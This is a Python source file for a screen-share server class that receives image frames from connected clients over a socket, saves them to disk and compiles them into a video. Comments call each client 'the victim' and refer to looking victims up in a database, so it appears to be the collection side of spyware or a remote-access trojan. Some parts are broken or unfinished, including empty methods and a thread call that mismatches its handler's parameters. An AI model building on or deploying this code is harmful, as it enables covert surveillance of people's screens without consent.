import socket
import threading
import os
import cv2
import numpy as np


class ScreenShareManager():
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = []

    def add_client(self):
        pass

    def remove_client(self):
        pass

    def connect(self):
        """Handles the connection with the clients"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)

        print("[*] Waiting for Screenshare...")

        while True:
            client, addr = s.accept()

            # Check if the client already exists within the list of clients, if they do, then remove them
            for c in self.clients:
                if c[1][0] == addr[0]:
                    self.clients.remove(c)

            self.clients.append((client, addr))

            print(f"[*] Connection is established successfully with {addr[0]}")

            # Main information about the client from other servers
            # Get the victim from the database

            # Make a thread which handles the screenshare for that client.
            t = threading.Thread(target=self.handle_client,
                                 args=(client))
            t.start()  # Start the thread

    def handle_client(self, client_socket, victim):
        """Handles the client"""
        # Directory of where we want to save the images
        directory = victim.screen_share_source.replace("video.avi", "")
        if not os.path.exists(directory):
            os.makedirs(directory)

        while True:
            try:
                # Get images from the client
                img = self.get_images(client_socket)
                if img is None:
                    break

                # Save the image to the directory
                img_filename = os.path.join(
                    directory, f"frame_{len(os.listdir(directory))}.jpg")
                cv2.imwrite(img_filename, img)

            except Exception as e:
                print(f"Error handling client: {str(e)}")
                for client in self.clients:
                    if client[0] == client_socket:
                        print(
                            f"[*] Client {client[1][0]} disconnected from file transfer")
                break

        # After the loop, make a video from the images
        video_filename = self.make_video(directory)
        print(f"[*] Video saved at: {video_filename}")

    def get_images(self, client_socket):
        """Gets the images from the client_socket"""
        img_data = b''

        # Receive the image data size
        img_size = int.from_bytes(client_socket.recv(4), byteorder='big')

        # Receive the image data
        while len(img_data) < img_size:
            chunk = client_socket.recv(4096)
            if not chunk:
                break
            img_data += chunk

        if len(img_data) == img_size:
            # Deserialize the image data
            img = cv2.imdecode(np.frombuffer(
                img_data, dtype=np.uint8), cv2.IMREAD_COLOR)
            return img
        return None

    def make_video(self, directory):
        """Makes a video from the images"""
        images = [img for img in os.listdir(directory) if img.endswith(".jpg")]
        frame = cv2.imread(os.path.join(directory, images[0]))
        height, width, layers = frame.shape
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        video_filename = os.path.join(directory, "video.avi")
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (width, height))

        for image in images:
            img_path = os.path.join(directory, image)
            frame = cv2.imread(img_path)
            out.write(frame)

        out.release()
        cv2.destroyAllWindows()
        return video_filename
